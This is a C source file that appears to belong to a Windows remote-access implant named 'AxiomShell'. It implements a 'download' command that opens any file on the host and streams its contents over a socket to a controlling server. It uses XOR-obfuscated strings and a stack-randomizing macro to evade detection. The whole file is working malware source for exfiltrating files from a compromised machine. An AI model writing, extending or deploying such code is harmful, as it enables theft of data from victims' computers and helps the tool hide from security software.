#include "AxiomShell.h"
#include "autoxor.h"
#include <fileapi.h>
#include <windows.h>
#include <winnt.h>
#include <minwinbase.h>
#include <stdio.h>

BOOL BUILTIN_download(SOCKET sock, size_t argc, char **argv)
{
	STACK_RANDOMIZER;
	HANDLE hFile;
	JSON_READY_FOR_DOWNLOAD_ARGS downloadArgs;
	DWORD filesizeHigh;
	DWORD filesizeLow;
	LARGE_INTEGER filesize;
	SIZE_T read_count;
	DWORD read_count_tmp;
	CHAR buffer[4096];

	if (argc !=1)
	{
		JSON_send_packets(JsonCommandOutput, sock, (void *)XorStr("[!] Usage: download {PATH}\n"));
		return (FALSE);
	}

	// First try to open a read HANDLE to the file
	hFile = CreateFileA(
		argv[0],
		GENERIC_READ,
		FILE_SHARE_READ,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		0
	);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		JSON_send_packets(JsonCommandOutput, sock, (void *)XorStr("[!] File not found or permission denied\n"));
		return (FALSE);
	}

	// If successful, extract its size
	filesizeLow = GetFileSize(hFile, &filesizeHigh);
	if (filesizeLow == INVALID_FILE_SIZE)
	{
		JSON_send_packets(JsonCommandOutput, sock, (void *)XorStr("[!] Failed to get the file size, aborting\n"));
		CloseHandle(hFile);
		return (FALSE);
	}
	filesize.LowPart = filesizeLow;
	filesize.HighPart = filesizeHigh;

	// Send the notification to the server that the file is ready to be downloaded, along with:
	// - The savepath
	// - The filesize
	downloadArgs.local_filepath = argv[0];
	downloadArgs.filelen = filesize.QuadPart;
	JSON_send_packets(JsonReadyForDownload, sock, (void*)&downloadArgs);

	// Now read the file chunk-by-chunk and send each one to the server, raw
	read_count = 0;
	while (read_count < (SIZE_T)filesize.QuadPart)
	{
		memset(buffer, 0, sizeof(buffer));
		ReadFile(
			hFile,
			buffer,
			sizeof(buffer),
			&read_count_tmp,
			NULL
		);
		send(sock, buffer, read_count_tmp, 0);
		read_count += read_count_tmp;
	}

	// Cleanup
	CloseHandle(hFile);
	return (TRUE);
}

